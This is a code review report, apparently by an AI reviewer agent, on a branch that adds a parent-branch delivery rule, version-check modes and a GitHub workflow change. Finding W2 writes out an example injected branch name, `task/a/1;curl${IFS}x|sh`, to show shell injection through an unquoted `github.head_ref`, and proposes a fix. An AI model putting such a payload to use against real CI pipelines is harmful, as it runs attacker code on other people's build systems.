# Code review: Parent Branch Delivery Rule (issue 113)

Reviewer: fullstack-code-reviewer. Scope: production code and texts of `feature/113-parent-branch-delivery-rule` against `origin/master` (tests excluded, covered elsewhere).
Contract: `.claude/concepts/2026-10-30-parent-branch-delivery-rule.md` (approved).

**Verdict:** FIX THEN SHIP — no BLOCKER, 7 WARN, 8 NIT.

The rule is implemented end to end and is mostly faithful to the contract: the layout is derived (L-1), the one selector and matcher exist, the four readers use the selector, the closed defect set exists, dispatch is gated, `needs-issue` refuses before the cut (and under `--dry-run`), G-7 with two remedies, `--accept-single-branch` (riding only with `--record-delivery`, after G-1..G-6), R-8 failed records, the R-9 next command, P7b with `version-raise-failed`, the `version-fields` conflict class, `parent`/`exact`/`raise` modes, and the version raised in all five places. Single-block contracts keep the old code paths: `layout is None` skips every new branch, and `report["layout_defects"]` is added only when a layout exists. The defects below are about edges, diagnostics and one CI regression.

---

## WARN

**W1. The workflow change pulls PRs that were never checked under the version check, which contradicts the contract.** `.github/workflows/version-bump.yml:3-5`, `.claude/scripts/check_version_bump.py:156-168`
The `branches: [master]` filter is gone, and only a `task/*` head into a non-default base gets `parent` mode. Every other PR into a non-default base now gets the **default** mode against that base:
- stacked single-block PRs
- a hand-named sub-task or remedy branch into the parent branch

So a stacked PR that changes shipped files must raise again on top of its base, and a non-`task/*` PR into a parent branch is forced to raise. That second case is the exact thing the rule forbids. The contract's Version check mode row says "Stacked pull requests of single-block work are not `task/*` heads, so they are unaffected". That is false as implemented. Fix: in `main`, when `args.base != default_ref` and the head is not `task/*`, print "not a pull request into the default branch; no check" and return 0, which keeps the old reach. Or apply `parent` mode to every non-default base. A JOURNAL entry was appended (contract defect).

**W2. The workflow puts `github.head_ref` unquoted into `run:`, which allows shell injection.** `.github/workflows/version-bump.yml:14`
`--head-ref ${{ github.head_ref }}` is substituted into the shell script before bash runs it. Git ref names may contain `;`, `|`, `$`, `(`, `)`, `{`, `}` and backticks, so a branch such as `task/a/1;curl${IFS}x|sh` runs code. Today the real impact is low:
- `pull_request` from a fork gets a read-only token and no secrets.
- The PR's author controls the checked-out script anyway.

But this is GitHub's documented anti-pattern. The job also has no `permissions:` block, so same-repository PRs get the repository default token. Fix: `env: HEAD_REF: ${{ github.head_ref }}`, `BASE_REF: ${{ github.base_ref }}` and `DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}`, then `"$HEAD_REF"` (quoted) in `run:`. Add `permissions: { contents: read }`.

**W3. Nothing checks that the layout's parent branch matches the sub-task briefs' `base:`.** `.claude/scripts/pr_merged.py:1602` (delivery_layout), `:1674-1677` (effective_base), `.claude/scripts/land_contract.py:2036-2042`
- `effective_base` prefers `declared_topology`'s parent (the sub-task briefs' `base:`) over `layout.parent_branch` (the header brief's `branch:`).
- `delivery_layout` raises a defect only for `ambiguous` or `parent-is-default` *among the sub-task briefs*. It never compares them with the header brief.
- With sub-task briefs at `base: X` and a header brief at `branch: Y`, sub-tasks are cut from and merged into X. The landing lands X (P1 prefers `parent_brief_of`, and the selector is only a fallback). G-7 and R-9 then judge against Y: `landing_evidence_holds` fails, and the next command suggests `--accept-single-branch` for what was a real parent landing.

L-2/L-5 make the header brief authoritative. Fix: in `delivery_layout`, when `topology.parent_branch` and `parent_branch` are both set and differ, add `ambiguous` with a remedy naming both branches.

**W4. A stale checkout or legacy records lead the owner to accept a real landing as a single-branch delivery.** `.claude/scripts/pr_merged.py:4428-4441`, `:1853-1856`, `:1618-1631`
`needs_accept` and the live `single-branch-delivery` defect are computed from records in the *local checkout*. Two cases go wrong:
- **Stale checkout:** the Records PR was merged on GitHub but the checkout was not refreshed. No Records PR is open, local records lack the sub-task records, the candidate reads `single-branch`, and R-9 names `/pr-merged <pr> --record-delivery --accept-single-branch`.
- **Legacy records:** sub-task records written before `base_ref` existed (pre-0.5.0) never satisfy R-7.

In both cases a legitimate parent landing gets stamped `layout: single-branch-accepted` by an owner following the printed command. Fix: either compare the local results folder with `origin/<default>` (as `cleanup_delivered` does with `load_records_at`) before marking `needs_accept`, or put "refresh from `origin/<default>` and rerun" first in the G-7 and R-9 reason text. Also: `needs_accept` is set even when the open-records read failed (`records_read_failed`), so R-9 names a command that will exit 10. Gate it on `not records_read_failed`.

**W5. The single matcher is looser than the L-3 wording, not only stricter.** `.claude/scripts/pr_merged.py:1444-1447`
L-3 says it matches "when the stem equals the slug". The implementation matches when *any* token of the value equals the slug, case-insensitively. Compared with the matchers it replaced:
- **Stricter:** `none - <slug>` is now unset, where the old `_names_contract` matched it. This is intended.
- **Looser:** `contract: 2026-10-30-new (replaces 2026-10-01-old)` now names *both* contracts. The old `_brief_names_contract` (`Path(named).stem == id`) matched only the new one.

`declared_topology`, `parent_brief_of`, `read_work_item_briefs` (scoped) and the landing's `build_delivery_set` ambiguity check all go through this matcher. So a brief that mentions an older contract can make the older contract's topology `ambiguous`, or halt its landing with `ambiguous-parent`. Fix: compare the whole value's stem, after stripping quotes, backticks and one leading path, which matches L-3. Or record the any-token reading in the contract as a justified divergence.

**W6. `parent-is-default` ignores protected branches.** `.claude/scripts/pr_merged.py:1591`, `:1602`
L-4 says the parent is "never the default or a protected branch". `delivery_layout` compares only `branch == default` and passes `[default]` as the protected list to `declared_topology`. The landing reads `contractLanding.protectedBranches` (`land_contract.py:1986`). A brief with `branch: release` (protected) passes the approval gate and dispatch, then halts `parent-is-default` at P1. Fix: read `protectedBranches` from the conventions file at `origin/<default>` (the same file `version_raise_on` reads) and use it in both checks.

**W7. R-8 combined with G-3 leaves a contract that was mid-flight at upgrade with no exit.** `.claude/scripts/pr_merged.py:4333-4337`, `:4159-4161`
A consumer upgrades while an approved two-block contract has a sub-task PR already open into the default branch, opened under the old rules. When that PR merges, R-8 writes a `failed` record. G-3 then refuses `--accept-single-branch` (it refuses on any failed record), and `advance` returns `escalate`, telling the operator to amend the contract. There is no command that clears this. The contract's row 9 names "remedies" but none applies here. This is a contract defect, and a JOURNAL entry was appended. Suggested direction: either skip R-8 for a sub-task whose state entry was dispatched before the layout existed (state `base` equals default and no `base_source`), or have the `escalate` text name the accept route explicitly, after the owner deletes or supersedes the failed record.

---

## NIT

- **N1. The no-parent message misleads when the header is set but the brief is missing.** `pr_merged.py:1584`. When the header names a brief that is not in this checkout (common when `/advance` runs in a worktree cut from the default branch before the brief is merged), the defect says "no Work Item Brief is linked to this contract's header" and the remedy says "run /task". Say "the header names X, which is not in this checkout".
- **N2. `_contract_field_state` reads some placeholder values as "other".** `pr_merged.py:1440`. `none (pending)`, `none-foo`, `TBD` and `n/a` read as `other`. On a header-linked brief that makes `select_linked_brief` return None and raises a false `no-parent-branch`.
- **N3. R-8 can fire when `headRefName` is missing.** `pr_merged.py:4333-4337`. `pr.get("headRefName") in (branch_for(...), recorded_branches.get(task.id))` is True when both the key and the recorded branch are absent (`None in (x, None)`). Guard on a non-empty `headRefName`.
- **N4. `--raise` does not check which tree it is in.** `check_version_bump.py:109-124`. It does not check that HEAD is the parent branch or that `origin/<default>` is merged in. Under `landing: manual` (CLAUDE.md), an operator who runs it in the wrong checkout commits a raise there with `--no-verify`. The commit uses `-- <MANIFESTS>`, so other staged files stay out, but a manifest's unrelated working-tree edits go in with it. `--no-verify` matches `land_contract.git_commit`'s documented policy ("verified by the gate, not by a hook"), and P8 does verify this commit. In the manual path nothing verifies it except `--exact`, and consumer projects' commit-msg or DCO hooks are skipped. Suggest refusing when `git status --porcelain -- <MANIFESTS>` is non-empty before the rewrite.
- **N5. `--raise` and `--exact` use the live remote ref, not the merged commit.** `land_contract.py:2491-2498`. P7b reads `origin/<default>`, while P7 merged `mark_m`. Refs are shared across worktrees, so a concurrent fetch could make the two differ. P12 `master-moved` catches it, so this only costs a wasted run.
- **N6. A one-line manifest loses edits in `merge_version_fields`.** `land_contract.py:1221`. The `"version"`-line filter is line-based. In a minified (one-line) manifest every edit "carries version", so the parent's other edits would be dropped silently. The repository's manifests are pretty-printed, and consumer manifests are a Non-Goal. The resolution also normalises CRLF to LF, the same as `merge_union`.
- **N7. Two small normalisation gaps.** `pr_merged.py:1608`. `./plugin.json` is not normalised before the `MANIFESTS` comparison. Also `version_raise_on` returns False when `origin/<default>` is unreadable, which fails open. CI `parent` mode is the backstop.
- **N8. Text inaccuracies.**
  - `skills/advance/SKILL.md` ("For a contract the rule does not judge (its Status is not draft or approved)") leaves out the single-block case, which is also not judged.
  - `skills/flow/SKILL.md:344` ("A single-block contract, the only kind with no parent branch") ignores exempt legacy contracts.
  - One token, `single-branch-delivery`, names three things: a layout defect, a G-7 reason and a stored `failure:`. VOCABULARY says a Layout defect "never enters a stored record", which reads as contradicted. Consider calling the R-8 failure `failure: sub-task-merged-to-default`.

---

## Contract alignment

| Item | Result |
|---|---|
| L-1 judged only for 2+ mergeable blocks and draft/approved | met (`pr_merged.py:1571-1573`) |
| L-2 one selector, four readers | partly: P1 uses `parent_brief_of` first and the selector only as a fallback (W3) |
| L-3 one matcher owning filtering; feeders unfiltered; thin wrappers | met structurally; matching rule diverges (W5) |
| L-4 never default or protected | partly (W6) |
| L-5 `declared_topology` agreement | met among sub-task briefs; header brief not compared (W3) |
| Defect set closed, blocks dispatch and approval only | met |
| Exit 7 `base-not-declared` / `needs-issue` with distinct remedies, `--dry-run` refuses | met (`pr_merged.py:4491-4515`) |
| G-7, both remedies, `--accept-single-branch` refusals | met (G-1, G-3, awaiting-merge, exit 10) |
| R-7 live report only when known, no open Records PR, GitHub answered | met, with the W4 caveats |
| R-8 failed record, no sub-issue close | met (N3, W7) |
| R-9 next command, never the refused one | met (W4 caveat) |
| P7b, idempotent, `version-raise-failed`, 26 halts | met |
| R-3 `version-fields` region test | met (`merge_version_fields`; uses `_split_merge_file`, equivalent to `conflict_regions`) |
| R-4 manual landing text | met (CLAUDE.md) |
| `parent` / `exact` modes | met; reach of default mode widened (W1) |
| Files to touch | all touched files are listed; `cleanup_delivered.py` is listed but unchanged (allowed: "a test pins that it is unchanged") |
| Off-area drift | none: every changed file is in Files to touch, apart from the contract, brief, JOURNAL and the review artefact |

## Shell, path and wrong-tree audit

- Every git call in the new Python code uses argument lists, so there is no shell. Branch names from briefs are always prefixed (`origin/…`, `refs/remotes/origin/…`), so a leading `-` cannot become an option.
- `_p7b_version_raise` runs with `cwd=wt`, so the raise lands in the landing worktree, never the operator's checkout.
- Windows paths: `select_linked_brief` normalises `\` to `/` on `_path` and uses `Path.as_posix()` on the header. Header matching is case-sensitive, which can miss on Windows when the case differs (minor).
- The only shell surface is the workflow (W2).

## Janitor

- **MECHANISMS.md:** appended "Brief linkage selector and matcher" and "Plugin version check modes". The contract declared no new mechanism, but both are now cross-script seams that future contracts must reuse, and nothing in the registry named them.
- **VOCABULARY.md:** the contract's Registry text is fully applied (amended Contract Delivery and four new terms). Nothing to add.
- **JOURNAL.md:** two `post-impl divergence` entries (W1 and W7).
- **INTEGRATION.md:** not applicable (no API or SignalR surface).
- **Not written:** `~/.claude/logs/reviewer-verdicts.jsonl`. The caller limited edits to the report and the registries.
